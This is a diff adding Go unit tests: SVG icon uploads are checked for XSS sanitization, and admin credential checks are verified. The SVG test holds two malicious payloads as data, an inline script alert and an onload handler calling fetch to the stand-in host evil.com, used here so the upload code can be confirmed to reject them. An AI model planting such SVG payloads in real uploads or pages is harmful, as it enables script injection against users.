@@ -157,4 +157,45 @@ func TestSaveIconAndMimeDetection(t *testing.T) {
 	if mgr.GetIconMime() != "image/png" {
 		t.Errorf("expected MIME 'image/png', got '%s'", mgr.GetIconMime())
 	}
+
+	// 4. Test SVG XSS Sanitization
+	maliciousSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert('xss')</script></svg>`)
+	if err := mgr.SaveIcon(bytes.NewReader(maliciousSVG), "hack.svg"); err == nil {
+		t.Fatalf("expected SaveIcon to reject malicious SVG with <script>, but succeeded")
+	}
+
+	maliciousOnload := []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil.com')"></svg>`)
+	if err := mgr.SaveIcon(bytes.NewReader(maliciousOnload), "onload.svg"); err == nil {
+		t.Fatalf("expected SaveIcon to reject malicious SVG with onload handler, but succeeded")
+	}
+}
+
+func TestConstantTimeAuth(t *testing.T) {
+	tmpDir, err := os.MkdirTemp("", "cs-config-auth-*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	mgr, _ := NewManager(tmpDir)
+	_ = mgr.Update(Settings{
+		AuthUser: "admin",
+		AuthPass: "super-secret-password-1234",
+	})
+
+	if !mgr.CheckAuth("admin", "super-secret-password-1234") {
+		t.Error("expected CheckAuth to match correct credentials")
+	}
+	if mgr.CheckAuth("admin", "wrong-password") {
+		t.Error("expected CheckAuth to reject wrong password")
+	}
+	if mgr.CheckAuth("wrong-user", "super-secret-password-1234") {
+		t.Error("expected CheckAuth to reject wrong user")
+	}
+	if !mgr.CheckPass("super-secret-password-1234") {
+		t.Error("expected CheckPass to match correct password")
+	}
+	if mgr.CheckPass("wrong") {
+		t.Error("expected CheckPass to reject wrong password")
+	}
 }
